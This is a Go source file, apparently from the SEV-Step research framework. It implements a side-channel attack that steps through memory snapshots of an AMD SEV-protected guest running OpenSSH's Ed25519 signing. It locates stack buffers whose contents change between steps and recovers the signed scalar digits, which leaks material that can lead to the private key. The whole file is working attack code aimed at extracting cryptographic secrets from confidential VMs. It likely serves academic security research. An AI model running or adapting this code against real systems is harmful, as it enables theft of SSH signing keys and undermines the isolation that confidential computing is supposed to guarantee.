package main

import (
	"bytes"
	"crypto/ed25519"
	"fmt"
	"io"
	"pfFingerprint"

	"github.com/UzL-ITS/sev-step/sevStep"
)

//getStackBufCandidates returns a map containing all attackConfig.StackBufAlignment memory locations
//that show changes in their next attackConfig.StackBufBytes between adjacent memory snapshots in events
//This makes them candidates for the stack buffer whose change we want to observe
func getStackBufCandidates(attackConfig *pfFingerprint.OSSHAttackConfigEdDSA, events []*sevStep.Event) map[int]bool {
	offsetsWithChange := make(map[int]bool)
	var beforeSwap, afterSwap []byte
	for cycleIDX := 0; cycleIDX < attackConfig.MainLoopCycles; cycleIDX++ {
		for cycleRelEventIDX := 0; cycleRelEventIDX < attackConfig.MemAccessesPerCycle-1; cycleRelEventIDX++ {
			beforeSwap = events[(cycleIDX*attackConfig.MemAccessesPerCycle)+cycleRelEventIDX].Content
			afterSwap = events[(cycleIDX*attackConfig.MemAccessesPerCycle)+cycleRelEventIDX+1].Content
			for _, v := range getUpdatedOffsets(beforeSwap, afterSwap, attackConfig.StackBufAlignment, attackConfig.StackBufBytes) {
				offsetsWithChange[v] = true
			}
		}
	}
	return offsetsWithChange
}

//getUpdatedOffsets finds all blocks with the given block size and alignment
//that are not equal in a and b and returns their offsets
func getUpdatedOffsets(a, b []byte, byteAlignment, blockSizeBytes int) []int {
	offsetsWithChange := make([]int, 0)
	xorBuf := make([]byte, len(a))
	for i := range a {
		xorBuf[i] = a[i] ^ b[i]
	}
	var block []byte
	var maxJump int
	if byteAlignment > blockSizeBytes {
		maxJump = byteAlignment
	} else {
		maxJump = blockSizeBytes
	}
	for i := 0; i < len(a)-maxJump; i += byteAlignment {
		block = xorBuf[i : i+blockSizeBytes]
		blockEmpty := true
		for j := range block {
			if block[j] != 0 {
				blockEmpty = false
				break
			}
		}
		if !blockEmpty {
			offsetsWithChange = append(offsetsWithChange, i)
		}
	}
	return offsetsWithChange
}

//filterOffsetsViaPlaintext removes all candidates from candidates map whose plaintext does not match the "marker values" from
//the OSSH implementation. This is intended as a debug check and can only be applied if the memory snapshots contain
//plaintext
func filterOffsetsViaPlaintext(attackConfig *pfFingerprint.OSSHAttackConfigEdDSA,
	candidates *map[int]bool, events []*sevStep.Event) (int, error) {

	matches := 0
	for offset, ok := range *candidates {
		if !ok {
			continue
		}
		//for offset := 0; offset < 4096-256; offset += 16 {
		matchesAll := true
		var beforeSwap []byte
		for cycleIDX := 1; cycleIDX < attackConfig.MainLoopCycles && matchesAll; cycleIDX++ {

			beforeSwap = events[(cycleIDX * attackConfig.MemAccessesPerCycle)].Content

			ok, err := debugCheckBeforeValue(cycleIDX, offset, beforeSwap)
			if err != nil {
				return 0, fmt.Errorf("debugCheckMemValues failed : %v\n", err)
			}
			if !ok {
				matchesAll = false
				break
			}
			//log.Printf("Offset %x match in cycle %v for access idx %v\n", offset, cycleIDX, j)
		}
		if matchesAll {
			matches++
		} else {
			(*candidates)[offset] = false
		}

	}
	return matches, nil
}

func calcPrivKeyDbgData(rawPrivKey io.Reader, messageFromSignature []byte) (*PrivKeyDbgData, error) {
	privKey, err := parseOSSHKey(rawPrivKey)
	if err != nil {
		return nil, fmt.Errorf("failed to parse priv key : %v", err)
	}
	var ok bool
	privKeyDbgData := &PrivKeyDbgData{}
	privKeyDbgData.edPrivKey, ok = privKey.(*ed25519.PrivateKey)
	if !ok {
		return nil, fmt.Errorf("parsed key is not ed25519")
	}
	privKeyDbgData.correctB = calcOpenSSHB(*privKeyDbgData.edPrivKey, messageFromSignature)

	return privKeyDbgData, nil
}

//recoverSignedBFromSC recovers the signed b value from the OSSH edDSA implementation by observing
//if the memory content of certain events' memory snapshots changes at offsets  certain points.
func recoverSignedBFromSC(offset int, events []*sevStep.Event, attackConfig *pfFingerprint.OSSHAttackConfigEdDSA) ([]int8, bool) {
	recoveredB := make([]int8, 85)
	var beforeSwap, afterSwap []byte
	for cycleIDX := 1; cycleIDX < attackConfig.MainLoopCycles; cycleIDX++ {
		baseIDX := cycleIDX * attackConfig.MemAccessesPerCycle
		beforeSwap = events[baseIDX].Content
		afterSwap = events[baseIDX+1].Content
		foundMatch := false
		if !bytes.Equal(beforeSwap[offset:offset+256], afterSwap[offset:offset+256]) {
			recoveredB[cycleIDX] = 1 // or -1
			foundMatch = true
		}
		beforeSwap = events[baseIDX+2].Content
		afterSwap = events[baseIDX+3].Content
		if !bytes.Equal(beforeSwap[offset:offset+256], afterSwap[offset:offset+256]) {
			recoveredB[cycleIDX] = 2 //or -2
			if foundMatch {
				//log.Printf("Warning, multiple matches")
				return nil, false
			}
			foundMatch = true
		}
		beforeSwap = events[baseIDX+4].Content
		afterSwap = events[baseIDX+5].Content
		if !bytes.Equal(beforeSwap[offset:offset+256], afterSwap[offset:offset+256]) {
			recoveredB[cycleIDX] = 3 // or -3
			if foundMatch {
				//log.Printf("Warning, multiple matches")
				return nil, false
			}
			foundMatch = true
		}
		beforeSwap = events[baseIDX+6].Content
		afterSwap = events[baseIDX+7].Content
		if !bytes.Equal(beforeSwap[offset:offset+256], afterSwap[offset:offset+256]) {
			recoveredB[cycleIDX] = -4 // not other case
			if foundMatch {
				//log.Printf("Warning, multiple matches")
				return nil, false
			}
			foundMatch = true
		} else { //this is the  "if b is negative" swap case. We can use it to remove the +-
			//uncertainty from the 1,2,3 case
			beforeSwap = events[baseIDX+8].Content
			afterSwap = events[baseIDX+9].Content
			if !bytes.Equal(beforeSwap[offset:offset+256], afterSwap[offset:offset+256]) {
				recoveredB[cycleIDX] *= -1
			}
		}

	}
	return recoveredB, true
}
